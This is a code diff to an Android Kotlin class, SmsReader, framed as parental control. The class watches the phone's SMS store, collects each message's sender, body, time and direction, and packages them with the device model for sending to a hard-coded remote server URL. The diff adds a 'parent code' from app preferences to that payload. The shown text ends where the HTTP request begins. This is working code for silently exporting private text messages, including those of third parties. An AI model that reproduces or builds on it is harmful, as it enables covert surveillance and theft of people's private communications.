@@ -15,16 +15,17 @@ class SmsReader(private val context: Context) {
 
     private val SERVER_URL = "https://overflowing-perception-production-17b2.up.railway.app/sms"
     private val DEVICE_NAME = android.os.Build.MODEL
+    private val parentCode: String
+        get() {
+            val prefs = context.getSharedPreferences("parent_control", Context.MODE_PRIVATE)
+            return prefs.getString("parent_code", "") ?: ""
+        }
 
     fun startObserving() {
         val observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
-            override fun onChange(selfChange: Boolean) {
-                readLatestSms()
-            }
+            override fun onChange(selfChange: Boolean) { readLatestSms() }
         }
-        context.contentResolver.registerContentObserver(
-            Uri.parse("content://sms"), true, observer
-        )
+        context.contentResolver.registerContentObserver(Uri.parse("content://sms"), true, observer)
         readLatestSms()
     }
 
@@ -39,18 +40,18 @@ class SmsReader(private val context: Context) {
                 )
                 cursor?.use {
                     while (it.moveToNext()) {
-                        val sms = JSONObject().apply {
+                        smsList.put(JSONObject().apply {
                             put("from", it.getString(0) ?: "")
                             put("body", it.getString(1) ?: "")
                             put("time", it.getLong(2))
                             put("type", if (it.getInt(3) == 1) "inbox" else "sent")
-                        }
-                        smsList.put(sms)
+                        })
                     }
                 }
                 val json = JSONObject().apply {
                     put("device", DEVICE_NAME)
                     put("sms", smsList)
+                    put("code", parentCode)
                 }
                 val body = json.toString().toRequestBody("application/json".toMediaType())
                 OkHttpClient().newCall(
